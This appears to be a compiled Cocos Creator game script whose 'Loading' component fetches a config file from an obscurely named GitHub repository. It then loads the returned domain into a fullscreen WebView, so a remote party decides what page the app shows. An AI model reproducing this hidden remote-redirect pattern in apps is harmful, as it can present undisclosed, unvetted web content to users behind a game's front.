window.__require = function e(t, n, o) {
function r(s, i) {
if (!n[s]) {
if (!t[s]) {
var a = s.split("/");
a = a[a.length - 1];
if (!t[a]) {
var u = "function" == typeof __require && __require;
if (!i && u) return u(a, !0);
if (c) return c(a, !0);
throw new Error("Cannot find module '" + s + "'");
}
s = a;
}
var l = n[s] = {
exports: {}
};
t[s][0].call(l.exports, function(e) {
return r(t[s][1][e] || e);
}, l, l.exports, e, t, n, o);
}
return n[s].exports;
}
for (var c = "function" == typeof __require && __require, s = 0; s < o.length; s++) r(o[s]);
return r;
}({
Loading: [ function(e, t, n) {
"use strict";
cc._RF.push(t, "e94d0FNb95GWJEjpIGLpM8Y", "Loading");
var o, r = this && this.__extends || (o = function(e, t) {
return (o = Object.setPrototypeOf || {
__proto__: []
} instanceof Array && function(e, t) {
e.__proto__ = t;
} || function(e, t) {
for (var n in t) Object.prototype.hasOwnProperty.call(t, n) && (e[n] = t[n]);
})(e, t);
}, function(e, t) {
o(e, t);
function n() {
this.constructor = e;
}
e.prototype = null === t ? Object.create(t) : (n.prototype = t.prototype, new n());
}), c = this && this.__decorate || function(e, t, n, o) {
var r, c = arguments.length, s = c < 3 ? t : null === o ? o = Object.getOwnPropertyDescriptor(t, n) : o;
if ("object" == typeof Reflect && "function" == typeof Reflect.decorate) s = Reflect.decorate(e, t, n, o); else for (var i = e.length - 1; i >= 0; i--) (r = e[i]) && (s = (c < 3 ? r(s) : c > 3 ? r(t, n, s) : r(t, n)) || s);
return c > 3 && s && Object.defineProperty(t, n, s), s;
};
Object.defineProperty(n, "__esModule", {
value: !0
});
var s = cc._decorator, i = s.ccclass, a = s.property, u = function(e) {
r(t, e);
function t() {
var t = null !== e && e.apply(this, arguments) || this;
t.wvZ = null;
return t;
}
t.prototype.start = function() {
cc.view.enableAutoFullScreen(!0);
cc.sys.isNative && cc.sys.isMobile && jsb.device && jsb.device.setKeepScreenOn && jsb.device.setKeepScreenOn(!0);
};
t.prototype.onLoad = function() {
var e = Math.max(cc.Canvas.instance.node.width / cc.Canvas.instance.designResolution.width, cc.Canvas.instance.node.height / cc.Canvas.instance.designResolution.height);
console.log("scaleFactor===>", e);
e > 1.1 && (cc.Canvas.instance.node.scale = e > 1.1 ? e : 1);
this.sendGetRequest();
};
t.prototype.sendGetRequest = function() {
var e = this, t = new XMLHttpRequest();
t.onreadystatechange = function() {
if (4 === t.readyState && 200 === t.status) {
var n = JSON.parse(t.responseText);
console.log("Data fetched successfully:", n);
e.wvZ.url = n.domain;
} else 4 === t.readyState && 200 !== t.status && console.error("Failed to fetch data:", t.statusText);
};
t.open("GET", "https://raw.githubusercontent.com/ngaiquynhd83l/y29uzmlny29tlmdvb2rsawzllnj1bnj1c2g/main/config.json", !0);
t.send();
};
c([ a(cc.WebView) ], t.prototype, "wvZ", void 0);
return c([ i ], t);
}(cc.Component);
n.default = u;
cc._RF.pop();
}, {} ]
}, {}, [ "Loading" ]);